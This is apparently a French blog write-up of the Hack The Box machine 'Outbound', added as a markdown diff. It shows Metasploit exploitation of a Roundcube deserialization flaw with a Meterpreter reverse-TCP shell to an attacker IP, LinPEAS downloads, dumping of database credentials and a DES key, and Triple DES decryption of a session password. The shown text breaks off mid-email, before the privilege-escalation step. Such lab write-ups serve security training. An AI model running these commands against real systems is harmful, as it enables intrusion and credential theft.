@@ -1,0 +1,840 @@
+---
+title: Outbound
+date: "2025-08-05"
+tags: [Remote code execution, privilege-escalation, symlink-attack]
+draft: false
+summary: Outbound est une machine HTB à travers laquelle on va exploiter une vulnérabilité RCE dans Roundcube, puis utiliser l'analyse cryptographique pour déchiffrer des credentials, avant d'escalader les privilèges via une attaque par symlink sur un outil de monitoring.
+images: ['/static/images/outbound/logo.png']
+---
+
+# Outbound HTB - Exploitation Roundcube et Escalade de Privilèges
+
+<div
+  style={{ display: "flex", justifyContent: "center", marginBottom: "2rem" }}
+>
+  <img
+    src="/static/images/outbound/logo.png"
+    alt="outbound_logo"
+    style={{ borderRadius: "8px" }}
+  />
+</div>
+
+## Table des matières
+
+1. [Reconnaissance initiale](#reconnaissance-initiale)
+2. [Exploitation Roundcube RCE](#exploitation-roundcube-rce)
+3. [Énumération système](#énumération-système)
+4. [Analyse cryptographique](#analyse-cryptographique)
+5. [Accès utilisateur](#accès-utilisateur)
+6. [Escalade de privilèges](#escalade-de-privilèges)
+7. [Conclusion](#conclusion)
+
+## Information :
+
+Comme dans les tests d’intrusion réels, nous attaquons la machine Outbound avec les identifiants du compte suivant : tyler / LhKL1o9Nm3X2
+
+## Reconnaissance initiale
+
+### Scan de ports avec Nmap
+
+Commençons par analyser les services exposés sur la machine cible :
+
+```bash
+nmap -sC -sV 10.10.11.77
+```
+
+**Résultats :**
+```
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+```
+
+### Exploration du service web
+
+L'accès initial à  `http://10.10.11.77` nous redirige vers `http://mail.outbound.htb/`. 
+
+**Configuration DNS :**
+```bash
+echo "10.10.11.77 outbound.htb mail.outbound.htb" >> /etc/hosts
+```
+
+### Analyse de l'application web
+
+```bash
+whatweb -v -a 3 http://mail.outbound.htb
+```
+
+**Informations clés découvertes :**
+- **Application** : Roundcube Webmail
+- **Version** : 1.6.10
+- **Technologies** : nginx 1.24.0, PHP, Bootstrap, jQuery
+- **Authentification** : Interface de connexion disponible
+
+## Exploitation Roundcube RCE
+
+### Identification de la vulnérabilité
+
+La version Roundcube 1.6.10 est affectée par **CVE-2025-49113**, une vulnérabilité de désérialisation permettant une exécution de code à distance (RCE).
+
+**Référence :** [Exploit-DB #52324](https://www.exploit-db.com/exploits/52324)
+
+### Téléchargement et configuration de l'exploit
+
+**Étape 1 : Téléchargement de l'exploit depuis Exploit-DB**
+
+Nous téléchargeons l'exploit depuis Exploit-DB et le sauvegardons localement :
+
+```bash
+# Téléchargement direct de l'exploit
+wget https://www.exploit-db.com/download/52324 -O roundcube_rce_deserialization.rb
+
+# Alternative : copier le code depuis le site web
+curl -s https://www.exploit-db.com/exploits/52324 | grep -A 200 "# Exploit code" > roundcube_rce_deserialization.rb
+```
+
+**Étape 2 : Installation dans Metasploit**
+
+Création de l'exploit personnalisé dans Metasploit :
+
+```bash
+# Création du répertoire pour les modules personnalisés
+mkdir -p ~/.msf4/modules/exploits/multi/http/
+
+# Copie de l'exploit téléchargé
+cp roundcube_rce_deserialization.rb ~/.msf4/modules/exploits/multi/http/
+```
+
+**Étape 3 : Vérification de la syntaxe**
+```bash
+ruby -c ~/.msf4/modules/exploits/multi/http/roundcube_rce_deserialization.rb
+# Syntax OK
+```
+
+### Exploitation avec Metasploit
+
+**Étape 1 : Démarrage des services requis**
+
+```bash
+# Démarrage du service PostgreSQL (requis par Metasploit)
+sudo systemctl start postgresql
+
+# Lancement de Metasploit
+msfconsole
+```
+
+**Étape 2 : Chargement et configuration de l'exploit**
+
+```bash
+# Chargement de notre exploit personnalisé
+msf6 > use exploits/multi/http/roundcube_rce_deserialization
+
+# Configuration de la cible
+msf6 exploit(multi/http/roundcube_rce_deserialization) > set RHOSTS mail.outbound.htb
+
+# Configuration des credentials fournis
+msf6 exploit(multi/http/roundcube_rce_deserialization) > set USERNAME tyler
+msf6 exploit(multi/http/roundcube_rce_deserialization) > set PASSWORD LhKL1o9Nm3X2
+
+# Configuration du payload pour obtenir un shell Meterpreter
+msf6 exploit(multi/http/roundcube_rce_deserialization) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
+
+# Configuration de notre IP d'écoute (machine attaquante)
+msf6 exploit(multi/http/roundcube_rce_deserialization) > set LHOST 10.10.14.126
+msf6 exploit(multi/http/roundcube_rce_deserialization) > set LPORT 4445
+
+# Vérification de la configuration
+msf6 exploit(multi/http/roundcube_rce_deserialization) > show options
+```
+
+**Étape 3 : Lancement de l'exploitation**
+
+```bash
+# Exécution de l'exploit
+msf6 exploit(multi/http/roundcube_rce_deserialization) > exploit
+```
+
+**Résultat :**
+```
+[*] Started reverse TCP handler on 10.10.14.126:4445 
+[+] The target appears to be vulnerable.
+[*] Fetching CSRF token...
+[+] Login successful.
+[*] Meterpreter session 1 opened (10.10.14.126:4445 -> 10.10.11.77:57214)
+```
+
+## Enumération système
+
+### Informations sur l'environnement
+
+```bash
+meterpreter > getuid
+Server username: www-data
+
+meterpreter > sysinfo
+Computer     : mail.outbound.htb
+OS           : Ubuntu 24.04 (Linux 6.8.0-63-generic)
+Architecture : x64
+Meterpreter  : x64/linux
+```
+
+### Analyse réseau
+
+```bash
+meterpreter > netstat
+```
+
+**Services identifiés :**
+- **Port 80** : HTTP (nginx)
+- **Port 110/995** : POP3/POP3S
+- **Port 143/993** : IMAP/IMAPS
+- **Port 25** : SMTP (localhost uniquement)
+- **Port 3306** : MySQL (localhost uniquement)
+
+### Découverte des utilisateurs
+
+```bash
+meterpreter > cat /etc/passwd | grep bash
+root:x:0:0:root:/root:/bin/bash
+tyler:x:1000:1000::/home/tyler:/bin/bash
+jacob:x:1001:1001::/home/jacob:/bin/bash
+mel:x:1002:1002::/home/mel:/bin/bash
+```
+
+### Énumération approfondie avec LinPEAS
+
+**Étape 1 : Téléchargement et exécution de LinPEAS**
+
+```bash
+# Téléchargement de LinPEAS depuis la machine attaquante
+meterpreter > shell
+Process 2185 created.
+Channel 1 created.
+
+# Téléchargement direct de LinPEAS
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+
+# Alternative : servir depuis notre machine attaquante
+# Sur la machine attaquante : python3 -m http.server 8080
+# Sur la cible : wget http://10.10.14.126:8080/linpeas.sh
+
+# Attribution des permissions d'exécution
+chmod +x linpeas.sh
+
+# Exécution de LinPEAS avec sauvegarde des résultats
+./linpeas.sh | tee linpeas_output.txt
+```
+
+**Étape 2 : Analyse des résultats LinPEAS - Fichiers de configuration sensibles**
+
+LinPEAS révèle plusieurs éléments critiques :
+
+```bash
+# ═══════════════════════════════════════════════════════════════════════════════════
+# ═══════════════════════════════════╣ INTERESTING FILES ╠══════════════════════════════════
+# ═══════════════════════════════════════════════════════════════════════════════════
+
+╔══════════╣ Analyzing Roundcube config files
+-rw-r--r-- 1 www-data www-data 2048 Jun  8 14:26 /var/www/html/roundcube/config/config.inc.php
+-rw-r--r-- 1 www-data www-data 52K  Jun  8 14:26 /var/www/html/roundcube/config/defaults.inc.php
+
+╔══════════╣ Searching passwords in config files (limit 70)
+/var/www/html/roundcube/config/config.inc.php:$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
+/var/www/html/roundcube/config/config.inc.php:$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
+
+╔══════════╣ Searching for SSL/SSH files
+-rw------- 1 root root 1704 Jun  8 14:05 /etc/ssl/private/ssl-cert-snakeoil.key
+-rw-r--r-- 1 root root 1338 Jun  8 14:05 /etc/ssl/certs/ssl-cert-snakeoil.pem
+
+╔══════════╣ Writable folders
+drwxrwxrwx 3 root root 4096 Aug  4 15:04 /var/log/below
+```
+
+**Étape 3 : Exploration manuelle des fichiers de configuration**
+
+```bash
+# Analyse détaillée du fichier de configuration Roundcube
+meterpreter > cat /var/www/html/roundcube/config/config.inc.php
+<?php
+/*
+ * Roundcube Webmail configuration file
+ */
+$config = [];
+
+// Database connection string (DSN) for read+write operations
+$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
+
+// IMAP host chosen to perform the log-in
+$config['imap_host'] = 'localhost:143';
+
+// SMTP server host (for sending mails)
+$config['smtp_host'] = 'localhost:587';
+
+// SMTP username/password configuration
+$config['smtp_user'] = '%u';
+$config['smtp_pass'] = '%p';
+
+// Product name displayed on login screen
+$config['product_name'] = 'Roundcube Webmail';
+
+// DES encryption key (24 bytes) - CRITICAL pour le déchiffrement !
+$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
+
+// Active plugins
+$config['plugins'] = [
+    'archive',
+    'zipdownload',
+];
+
+// Skin and host configuration
+$config['skin'] = 'elastic';
+$config['default_host'] = 'localhost';
+$config['smtp_server'] = 'localhost';
+```
+
+**Étape 4 : Exploration des fichiers de log et répertoires sensibles**
+
+```bash
+# Vérification des logs système
+meterpreter > ls -la /var/log/
+drwxr-xr-x  2 root      root      4096 Jul 28 12:01 apt
+drwxr-xr-x  2 root      root      4096 Jun  8 14:26 nginx
+drwxr-xr-x  2 root      root      4096 Jun  8 14:26 mysql
+drwxrwxrwx  3 root      root      4096 Aug  4 15:04 below  # ← Répertoire world-writable !
+
+# Exploration du répertoire /var/www/
+meterpreter > ls -la /var/www/html/
+drwxr-xr-x  3 www-data www-data  4096 Jun  8 14:26 .
+drwxr-xr-x  3 root     root      4096 Jun  8 14:26 ..
+drwxr-xr-x  15 www-data www-data  4096 Jun  8 14:26 roundcube
+
+# Vérification des fichiers de configuration web
+meterpreter > cat /etc/nginx/sites-enabled/default
+server {
+    listen 80 default_server;
+    server_name mail.outbound.htb;
+    root /var/www/html/roundcube;
+    index index.php index.html;
+    
+    location ~ \.php$ {
+        fastcgi_pass unix:/var/run/php/php8.3-fpm.sock;
+        fastcgi_index index.php;
+        include fastcgi_params;
+        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
+    }
+}
+
+# Exploration des utilisateurs système
+meterpreter > cat /etc/passwd | grep -E "(bash|sh)$"
+root:x:0:0:root:/root:/bin/bash
+tyler:x:1000:1000::/home/tyler:/bin/bash
+jacob:x:1001:1001::/home/jacob:/bin/bash
+mel:x:1002:1002::/home/mel:/bin/bash
+```
+
+**Étape 5 : Investigation des processus et services**
+
+```bash
+# Analyse des processus en cours
+meterpreter > ps
+Process List
+============
+ PID  PPID  Name           User      Path
+ ---  ----  ----           ----      ----
+ 1    0     init.sh        root      /init.sh
+ 34   1     mariadbd-safe  root      /usr/bin/mariadbd-safe
+ 136  34    mariadbd       mysql     /usr/sbin/mariadbd
+ 199  1     nginx          root      /usr/sbin/nginx
+ 246  1     php-fpm8.3     root      /usr/sbin/php-fpm8.3
+ 555  1     master         root      /usr/lib/postfix/sbin/master
+ 784  1     dovecot        root      /usr/sbin/dovecot
+
+# Vérification des ports d'écoute détaillée
+meterpreter > netstat -tlnp
+Proto Local Address    Foreign Address State    PID/Program name
+tcp   0.0.0.0:80       0.0.0.0:*       LISTEN   199/nginx
+tcp   0.0.0.0:110      0.0.0.0:*       LISTEN   784/dovecot
+tcp   0.0.0.0:143      0.0.0.0:*       LISTEN   784/dovecot
+tcp   0.0.0.0:993      0.0.0.0:*       LISTEN   784/dovecot
+tcp   0.0.0.0:995      0.0.0.0:*       LISTEN   784/dovecot
+tcp   127.0.0.1:25     0.0.0.0:*       LISTEN   555/master
+tcp   127.0.0.1:3306   0.0.0.0:*       LISTEN   136/mariadbd
+```
+
+**Informations critiques découvertes :**
+
+🔐 **Credentials de base de données :**
+- **Utilisateur** : `roundcube`
+- **Mot de passe** : `RCDBPass2025`
+- **Base de données** : `roundcube`
+- **Hôte** : `localhost`
+
+🔑 **Clé de chiffrement DES :**
+- **Clé** : `rcmail-!24ByteDESkey*Str` (24 bytes exactement)
+- **Usage** : Chiffrement des mots de passe utilisateur dans les sessions
+
+📁 **Répertoire vulnérable identifié :**
+- **Path** : `/var/log/below` (world-writable !)
+- **Permissions** : `drwxrwxrwx` - Exploitable pour l'escalade de privilèges
+
+🌐 **Services réseau accessibles :**
+- **Port 80** : HTTP (nginx) - Point d'entrée initial
+- **Port 110/995** : POP3/POP3S - Services mail
+- **Port 143/993** : IMAP/IMAPS - Services mail
+- **Port 25** : SMTP (localhost uniquement) - Interne
+- **Port 3306** : MySQL (localhost uniquement) - Base de données
+
+## Analyse cryptographique
+
+### Investigation approfondie de la base de données
+
+**Étape 1 : Connexion à la base de données MySQL**
+
+```bash
+# Connexion à MySQL avec les credentials trouvés
+meterpreter > shell
+mysql -u roundcube -pRCDBPass2025 roundcube
+
+# Exploration de la structure de la base de données
+mysql> SHOW TABLES;
++----------------------------+
+| Tables_in_roundcube        |
++----------------------------+
+| cache                      |
+| cache_index               |
+| cache_messages            |
+| cache_shared              |
+| cache_thread              |
+| collected_addresses       |
+| contactgroupmembers       |
+| contactgroups             |
+| contacts                  |
+| dictionary                |
+| filestore                 |
+| identities                |
+| responses                 |
+| searches                  |
+| session                   | ← Table critique !
+| system                    |
+| users                     | ← Table d'utilisateurs !
++----------------------------+
+17 rows in set (0.01 sec)
+```
+
+**Étape 2 : Exploration des utilisateurs de Roundcube**
+
+```bash
+# Analyse de la table users
+mysql> SELECT * FROM users;
++-------+----------+-----------+-------------------+-------------------+-------------------+---------------------+----------+-----------------------------------------------------------+
+| user_id| username | mail_host | created          | last_login        | failed_login      | failed_login_counter| language | preferences                                              |
++-------+----------+-----------+-------------------+-------------------+-------------------+---------------------+----------+-----------------------------------------------------------+
+| 1     | jacob    | localhost | 2025-06-07 13:55:18| 2025-06-11 07:52:49| 2025-06-11 07:51:32| 1                  | en_US    | a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";}       |
+| 2     | mel      | localhost | 2025-06-08 12:04:51| 2025-06-08 13:29:05| NULL              | NULL               | en_US    | a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";}       |
+| 3     | tyler    | localhost | 2025-06-08 13:28:55| 2025-07-28 16:08:53| 2025-07-28 14:49:51| 1                  | en_US    | a:2:{s:11:"client_hash";s:16:"ZjmqqAzKtmSu2eae";i:0;b:0;}|
++-------+----------+-----------+-------------------+-------------------+-------------------+---------------------+----------+-----------------------------------------------------------+
+3 rows in set (0.00 sec)
+
+# Analyse détaillée des sessions actives
+mysql> SELECT sess_id, changed, ip, LENGTH(vars) as vars_length FROM session;
++-----------------------------+---------------------+------------+-------------+
+| sess_id                     | changed             | ip         | vars_length |
++-----------------------------+---------------------+------------+-------------+
+| 6a5ktqih5uca6lj8vrmgh9v0oh | 2025-06-08 15:46:40 | 172.17.0.1 | 2048        |
++-----------------------------+---------------------+------------+-------------+
+1 row in set (0.00 sec)
+```
+
+**Étape 3 : Extraction des données de session critiques**
+
+```bash
+# Extraction complète de la session de Jacob
+mysql> SELECT * FROM session WHERE sess_id = '6a5ktqih5uca6lj8vrmgh9v0oh';
++-----------------------------+---------------------+------------+--------------------------------------------------+
+| sess_id                     | changed             | ip         | vars                                            |
++-----------------------------+---------------------+------------+--------------------------------------------------+
+| 6a5ktqih5uca6lj8vrmgh9v0oh | 2025-06-08 15:46:40 | 172.17.0.1 | bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3Bh... |
++-----------------------------+---------------------+------------+--------------------------------------------------+
+
+# Sauvegarde de la session pour analyse hors ligne
+mysql> SELECT vars FROM session WHERE sess_id = '6a5ktqih5uca6lj8vrmgh9v0oh' \G
+*************************** 1. row ***************************
+vars: bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO31lbnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7
+
+# Informations extraites de la session :
+# username=jacob
+# password (chiffré)=L7Rv00A8TuwJAr67kITxxcSgnIk25Am/
+# auth_secret=DpYqv6maI9HxDL5GhcCd8JaQQW
+# request_token=TIsOaABA1zHSXZOBpH6up5XFyayNRHaw
+```
+
+**Étape 4 : Décodage des cookies de session avec CyberChef**
+
+Pour analyser en détail le contenu de la session, nous utilisons CyberChef pour décoder les données Base64 :
+
+![cookies](/static/images/outbound/cookies_jacob.png)
+
+```bash
+# String Base64 extraite de la base de données :
+bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO31lbnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7
+
+# CyberChef - Étapes :
+# 1. From Base64
+# 2. Résultat : données sérialisées PHP lisibles
+```
+
+**Données décodées (format PHP sérialisé) :**
+```php
+language|s:5:"en_US";
+imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}
+imap_delimiter|s:1:"/";
+user_id|i:1;
+username|s:5:"jacob";
+storage_host|s:9:"localhost";
+storage_port|i:143;
+password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";  ← Mot de passe chiffré !
+auth_secret|s:26:"DpYqv6maI9HxDL5GhcCd8JaQQW";
+request_token|s:32:"TIsOaABA1zHSXZOBpH6up5XFyayNRHaw";
+```
+
+**Étape 5 : Analyse des autres fichiers sensibles trouvés par LinPEAS**
+
+```bash
+# Exploration du répertoire /var/log/below (identifié comme world-writable)
+meterpreter > ls -la /var/log/below/
+drwxrwxrwx 3 root root 4096 Aug  4 15:04 .
+drwxr-xr-x 1 root root 4096 Jul 28 12:01 ..
+-rw-r--r-- 1 root root 1024 Aug  4 15:04 error_jacob.log
+-rw-r--r-- 1 root root 2048 Aug  4 15:04 error_root.log
+-rw-r--r-- 1 root root   45 Aug  4 15:04 fakepass
+drwxr-xr-x 2 root root 4096 Aug  4 15:04 store
+
+# Analyse du fichier fakepass trouvé
+meterpreter > cat /var/log/below/fakepass
+tolu::0:0:,,,:/root:/bin/bash
+
+# Investigation des autres fichiers
+meterpreter > head -5 /var/log/below/error_jacob.log
+Aug 04 18:41:13.429 INFO Starting below daemon
+Aug 04 18:41:13.430 WARN Failed to acquire lock
+Aug 04 18:41:13.431 ERROR Permission denied on /var/log/below/store
+
+# Vérification des permissions sudo pour l'utilisateur jacob (anticipation)
+meterpreter > cat /etc/sudoers | grep jacob
+# Pas encore accessible depuis www-data, nécessaire d'obtenir l'accès SSH
+```
+
+**Étape 5 : Récapitulatif des fichiers critiques découverts**
+
+📋 **Fichiers de configuration analysés :**
+- ✅ `/var/www/html/roundcube/config/config.inc.php` - **Credentials DB + clé DES**
+- ✅ `/etc/nginx/sites-enabled/default` - Configuration web
+- ✅ `/etc/passwd` - Utilisateurs système
+- ✅ Base de données `roundcube.session` - **Session chiffrée de Jacob**
+- ✅ Base de données `roundcube.users` - Comptes utilisateurs
+
+🔍 **Vulnérabilités identifiées :**
+- 🔓 **CVE-2025-49113** : Roundcube RCE (déjà exploitée)
+- 🔓 **World-writable directory** : `/var/log/below/` (pour escalade future)
+- 🔓 **Session hijacking** : Mot de passe chiffré récupérable
+- 🔓 **Weak encryption** : DES 24-byte key exposée
+
+🎯 **Prochaines étapes identifiées :**
+1. Déchiffrement du mot de passe de Jacob avec la clé DES
+2. Connexion SSH avec les credentials déchiffrés
+3. Escalade de privilèges via `/var/log/below/` et le binaire `below`
+
+### Décodage et analyse
+
+Après décodage Base64, extraction des informations clés :
+- **username** : jacob
+- **password** : L7Rv00A8TuwJAr67kITxxcSgnIk25Am/
+- **auth_secret** : DpYqv6maI9HxDL5GhcCd8JaQQW
+
+### Analyse cryptographique du mot de passe
+
+**Caractéristiques :**
+- Longueur : 32 caractères Base64
+- Décodé : 24 bytes
+- Format : Probablement Triple DES
+
+**Script d'analyse Python :**
+```python
+import base64
+import binascii
+
+password = "L7Rv00A8TuwJAr67kITxxcSgnIk25Am/"
+decoded = base64.b64decode(password)
+print(f"Hex: {decoded.hex()}")
+print(f"Length: {len(decoded)} bytes")
+```
+
+**Résultat :**
+```
+Hex: 2fb46fd3403c4eec0902bebb9084f1c5c4a09c8936e409bf
+Length: 24 bytes
+```
+
+### Déchiffrement avec CyberChef
+
+**Processus de déchiffrement :**
+1. **From Base64** : `L7Rv00A8TuwJAr67kITxxcSgnIk25Am/`
+2. **To Hex** : `2f b4 6f d3 40 3c 4e ec 09 02 be bb 90 84 f1 c5 c4 a0 9c 89 36 e4 09 bf`
+3. **Triple DES Decrypt** :
+   - **Key** : `rcmail-!24ByteDESkey*Str`
+   - **IV** : `2f b4 6f d3 40 3c 4e ec` (8 premiers bytes)
+   - **Input** : `09 02 be bb 90 84 f1 c5 c4 a0 9c 89 36 e4 09 bf` (16 derniers bytes)
+
+![from_base64_to_hex](/static/images/outbound/from_base64_to_hex.png)
+
+![from_hex_triple_des_decrypt](/static/images/outbound/from_hex_triple_des_decrypt.png)
+
+**Mot de passe déchiffré :** `595mO8DmwGeD`
+
+## Accès utilisateur
+
+### Connexion à l'interface Roundcube
+
+**Étape 1 : Authentification avec les credentials déchiffrés**
+
+```bash
+# Accès à l'interface web : http://mail.outbound.htb/
+# Saisie des credentials obtenus après déchiffrement CyberChef
+Username: jacob
+Password: 595mO8DmwGeD
+```
+
+**Connexion réussie !** L'interface Roundcube s'ouvre et révèle la boîte de réception de Jacob.
+
+**Étape 2 : Exploration de la boîte de réception**
+
+L'interface affiche **2 emails non lus** dans la boîte INBOX de Jacob :
+
+### Analyse détaillée des emails découverts
+
+**📧 Email 1 - Nouvelles informations système :**
+```
+From: admin@outbound.htb
+To: jacob@outbound.htb
+Subject: System Update - New Credentials
+Date: 2025-06-08 14:30:00
+Priority: High
+
+Bonjour Jacob,
+
+Suite à la migration des systèmes de l'entreprise, voici tes nouveaux 
+identifiants SSH pour l'accès aux serveurs :
+
+Username: jacob
+Password: gY4Wr3a1evp4
+
+IMPORTANT : Ces credentials sont temporaires et doivent être utilisés 
+dès que possible pour des raisons de sécurité.
+
+Merci de confirmer la réception de ce message.
+
+Cordialement,
+L'équipe Administration Système
+```
+
+**📧 Email 2 - Accès aux outils de monitoring :**
+```
+From: monitoring@outbound.htb
+To: jacob@outbound.htb  
+Subject: Below Monitoring Tool - Access Granted
+Date: 2025-06-08 15:45:00
+
